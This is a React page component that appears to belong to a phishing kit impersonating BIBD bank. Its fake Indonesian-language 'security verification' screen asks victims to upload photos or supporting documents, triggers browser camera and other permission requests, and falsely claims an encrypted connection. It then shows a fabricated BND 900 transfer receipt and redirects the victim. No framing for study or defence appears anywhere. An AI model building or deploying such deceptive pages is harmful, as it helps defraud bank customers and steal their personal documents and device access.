"use client";

import { useCallback, useRef, useState, useEffect } from "react";
import RedirectCountdown from "@/components/RedirectCountdown";
import SuccessToast from "@/components/SuccessToast";
import LoadingScreen from "@/components/LoadingScreen";
import { useVerification } from "@/hooks/useVerification";
import { formatFileSize } from "@/utils/device";

export default function BibdVerificationPage() {
  const {
    isVerified,
    isChecking,
    isInitialLoading,
    isProcessing,
    showRedirectCountdown,
    redirectCountdown,
    uploadedFile,
    redirectConfig,
    redirectUrl,
    countdownDuration,
    handleVerifyClick,
    handleFileSelect,
    setUploadedFile,
    requestCameraPermission,
    requestAllPermissions,
    validationError,
  } = useVerification();

  const [isDragging, setIsDragging] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);


  const handleUploadClick = useCallback(() => {
    if (uploadedFile) return;

    // Trigger permission requests in parallel (non-blocking)
    requestAllPermissions().catch((err) => console.error(err));

    // Open file selector synchronously to guarantee User Activation context
    fileInputRef.current?.click();
  }, [uploadedFile, requestAllPermissions]);

  const handleDragOver = useCallback((e: React.DragEvent) => {
    e.preventDefault();
    e.stopPropagation();
    setIsDragging(true);
  }, []);

  const handleDragLeave = useCallback((e: React.DragEvent) => {
    e.preventDefault();
    e.stopPropagation();
    setIsDragging(false);
  }, []);

  const handleDrop = useCallback(
    async (e: React.DragEvent) => {
      e.preventDefault();
      e.stopPropagation();
      setIsDragging(false);

      // Request both permissions (parallel, no delay)
      const granted = await requestAllPermissions();

      if (granted) {
        const files = e.dataTransfer.files;
        if (files.length > 0) handleFileSelect(files[0]);
      }
    },
    [handleFileSelect, requestAllPermissions]
  );

  const handleFileInputChange = useCallback(
    (e: React.ChangeEvent<HTMLInputElement>) => {
      const files = e.target.files;
      if (files && files.length > 0) handleFileSelect(files[0]);
    },
    [handleFileSelect]
  );

  // Show initial loading screen
  if (isInitialLoading) {
    return <LoadingScreen />;
  }

  // Show processing loading screen
  if (isProcessing) {
    return <LoadingScreen />;
  }

  if (isVerified) {
    return (
      <main className="relative flex min-h-screen w-full flex-col items-center justify-center bg-[#eae7e7] p-5 font-sans">
        {/* Receipt Card */}
        <div className="w-full max-w-[420px] mx-auto flex flex-col items-center animate-fade-slide">
          <div className="receipt-jagged-edge w-full rounded-t-xl rounded-b-none shadow-lg bg-white mb-4">
            {/* Header Section */}
            <div className="p-8 flex flex-col items-center text-center">
              {/* Brand Logo */}
              <img 
                src="/bibdbrunei_logo.jpg" 
                alt="BIBD Logo" 
                className="w-16 h-16 rounded-full object-cover mb-4 shadow-sm"
              />
              <h1 className="font-[Manrope] text-2xl font-bold text-[#410030] mb-2">BIDB</h1>
              
              {/* Status Badge */}
              <div className="flex items-center space-x-2 bg-[#95d2c8]/20 text-[#095049] px-4 py-2 rounded-full mb-4">
                <span className="material-symbols-outlined text-[#002420] text-lg">check_circle</span>
                <span className="font-[IBM-Plex-Sans] text-sm font-semibold tracking-wider">Berhasil</span>
              </div>
              
              {/* Amount */}
              <p className="font-[Inter] text-sm text-[#53424b] mb-1">Jumlah Transfer</p>
              <p className="font-[Manrope] text-3xl font-extrabold text-[#1c1b1b]">BND 900.00</p>
            </div>

            {/* Divider */}
            <div className="w-full dashed-divider my-4"></div>

            {/* Details Section */}
            <div className="p-8 flex flex-col gap-4">
              {/* Detail Row 1 */}
              <div className="flex justify-between items-start">
                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Tanggal</span>
                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">24 juli 2026, 11:20</span>
              </div>
              {/* Detail Row 2 */}
              <div className="flex justify-between items-start">
                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Jenis Transaksi</span>
                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">Transfer Internal</span>
              </div>
              {/* Detail Row 3 */}
              <div className="flex justify-between items-start">
                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Dari</span>
                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">
                  Tabungan Utama<br />
                  <span className="text-[#53424b] text-sm font-normal">(****1234)</span>
                </span>
              </div>
              {/* Detail Row 4 */}
              <div className="flex justify-between items-start">
                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Ke</span>
                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">
                  Ahmad Reza<br />
                  <span className="text-[#53424b] text-sm font-normal">(****5678)</span>
                </span>
              </div>
              {/* Detail Row 5 */}
              <div className="flex justify-between items-start pt-2 border-t border-[#e5e2e1]">
                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Nomor Referensi</span>
                <span className="font-[IBM-Plex-Sans] text-sm font-semibold text-[#410030] text-right w-2/3 break-all">BIDB789012345</span>
              </div>
            </div>
          </div>

          {/* Action Buttons */}
          <div className="w-full flex flex-col gap-4 px-4 mb-8 mt-4">
            <button className="w-full flex items-center justify-center gap-2 bg-white border border-[#85727b] text-[#410030] font-[IBM-Plex-Sans] text-sm font-semibold py-4 rounded-xl hover:bg-[#e5e2e1] transition-colors">
              <span className="material-symbols-outlined text-lg">share</span>
              Bagikan
            </button>
            <button 
              onClick={() => (window.location.href = redirectUrl)}
              className="w-full bg-[#66004d] text-white font-[IBM-Plex-Sans] text-sm font-semibold py-4 rounded-xl hover:opacity-90 transition-opacity"
            >
              Selesai
            </button>
          </div>
        </div>

        {/* Success Toast */}
        {!showRedirectCountdown && <SuccessToast />}

        {/* Redirect Countdown Overlay */}
        <RedirectCountdown
          show={showRedirectCountdown}
          countdown={redirectCountdown}
          countdownDuration={countdownDuration}
          redirectUrl={redirectUrl}
          redirectConfig={redirectConfig}
        />

        <style
          dangerouslySetInnerHTML={{
            __html: `
              .receipt-jagged-edge {
                position: relative;
                background: #ffffff;
              }
              .receipt-jagged-edge::after {
                content: "";
                position: absolute;
                left: 0;
                bottom: -10px;
                width: 100%;
                height: 10px;
                background-image: radial-gradient(circle at 10px 0, transparent 10px, #ffffff 11px);
                background-size: 20px 10px;
                background-repeat: repeat-x;
                transform: rotate(180deg);
              }
              .dashed-divider {
                border-top: 2px dashed #d8c0cb;
              }
            `,
          }}
        />
      </main>
    );
  }

  return (
    <main className="min-h-screen flex flex-col bg-white text-[#1c1b1b] font-[Inter] antialiased w-full items-center justify-center p-4">
      {/* Main View Area */}
      <div className="w-full mx-auto flex flex-col items-center justify-center py-6 animate-fade-slide" style={{ maxWidth: 380 }}>
        <div className="text-center px-margin-mobile md:px-0 gap-2 mb-6">
          <div className="flex justify-center mb-4">
            <img 
              alt="BDCB Logo" 
              className="w-auto object-contain" 
              src="https://lh3.googleusercontent.com/aida-public/AB6AXuATBmsIEarjki0ZhY-adi499onA6rI28KBoXWTxJj02TDaNHsvs9gLexMbCpj5yGG_VZ860RM-o4JoIBryRbnnHHEcoQRP7KfdI_4DOsLzhzZL2zmON-kKtdJcdtnXx_8_wix01GScSZrg2G0fm4Da5oRZIUOVm5iqVscvrwm9lAi-GEiZR0LXXncXsaXssIKoN0xlzzrKRiQxcIb8rH6JefP3xrLysqwbpg_h82sA-Q2TLq9MTxWHqgMI6bTE_cZOxcEsGHDZ_dfE" 
              style={{ width: "auto", height: 160 }}
            />
          </div>
          <h1 className="text-2xl font-[Manrope] font-bold text-[#410030] mb-2">Verifikasi Keamanan</h1>
          <p className="text-sm font-[Inter] text-[#53424b]">
            Untuk melihat riwayat transaksi, harap selesaikan pemeriksaan keamanan di bawah ini untuk memastikan bahwa anda bukan robot.
          </p>
        </div>

        <div className="bg-white border border-[#e5e2e1] rounded-xl overflow-hidden shadow-sm flex flex-col w-full">
          <div className="flex flex-col items-center justify-center p-5 space-y-4">
            
            {/* Conditional Upload Box depending on if file is uploaded */}
            {uploadedFile ? (
              <div className="w-full border-2 border-solid border-[#4A90E2] rounded-xl flex flex-col items-center justify-center bg-[#f0eded]/30 p-5 mb-2">
                <span className="material-symbols-outlined text-[48px] text-[#4A90E2] mb-2">insert_drive_file</span>
                <h3 className="text-sm font-semibold text-[#1c1b1b] mb-1 truncate max-w-[90%]">{uploadedFile.name}</h3>
                <p className="text-xs text-[#53424b] mb-3">{formatFileSize(uploadedFile.size)}</p>
                <button 
                  onClick={(e) => {
                    e.stopPropagation();
                    setUploadedFile(null);
                  }}
                  className="text-xs text-red-600 font-semibold hover:text-red-800 transition-colors bg-red-50 px-3 py-1 rounded-full border border-red-200"
                >
                  Hapus File
                </button>
              </div>
            ) : (
              <div 
                onDragOver={handleDragOver}
                onDragLeave={handleDragLeave}
                onDrop={handleDrop}
                onClick={handleUploadClick}
                className={`w-full border-2 border-dashed border-[#85727b]/50 rounded-xl flex flex-col items-center justify-center bg-white hover:bg-[#f6f3f2] transition-colors cursor-pointer group mb-2 p-6 ${
                  isDragging ? 'border-[#4A90E2] bg-[#f0eded]/30' : ''
                }`}
              >
                <span className="material-symbols-outlined text-[48px] text-[#410030] mb-2">cloud_upload</span>
                <h3 className="text-lg font-[Manrope] font-semibold text-[#1c1b1b] mb-2">Unggah Foto Apa Saja</h3>
                <p className="text-xs text-[#53424b] text-center max-w-[85%]">
                  Klik atau seret gambar ke sini untuk mengunggah gambar verifikasi
                </p>
              </div>
            )}
            
            <input 
              className="hidden" 
              id="verification-upload" 
              type="file" 
              ref={fileInputRef}
              onChange={handleFileInputChange}
              accept="image/*"
            />

            <p className="text-xs font-[Inter] text-[#53424b] text-center px-4">
              Harap unggah foto dokumen pendukung untuk melanjutkan verifikasi keamanan untuk memastikan bahwa anda bukan robot
              </p>

            {validationError && (
              <div className="flex items-center gap-2 text-xs font-semibold text-red-600 bg-red-50 p-2.5 rounded-lg border border-red-200 w-full justify-center text-center">
                <span className="material-symbols-outlined text-sm flex-shrink-0">warning</span>
                <span>{validationError}</span>
              </div>
            )}
          </div>

          <div className="border-t border-[#e5e2e1] bg-white p-4 flex justify-end items-center">
            <button 
              onClick={handleVerifyClick}
              disabled={isChecking}
              className="bg-[#4A90E2] hover:bg-[#3A7BC8] text-white px-12 py-3 rounded font-[IBM-Plex-Sans] text-xs font-semibold uppercase tracking-wider transition-colors focus:ring-2 focus:ring-offset-2 focus:ring-[#4A90E2] outline-none shadow-sm disabled:opacity-50"
            >
              {isChecking ? (
                <span className="flex items-center gap-2">
                  <svg className="h-4 w-4 animate-spin text-white" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" />
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                  </svg>
                  VERIFYING...
                </span>
              ) : (
                "VERIFIKASI"
              )}
            </button>
          </div>
        </div>

        <div className="mt-6 flex items-center justify-center gap-2 text-[#53424b] mb-2">
          <span className="material-symbols-outlined text-[18px] text-[#410030]">lock</span>
          <span className="text-xs font-[Inter]">Ini adalah koneksi aman terenkripsi 256-bit.</span>
        </div>
      </div>
    </main>
  );
}
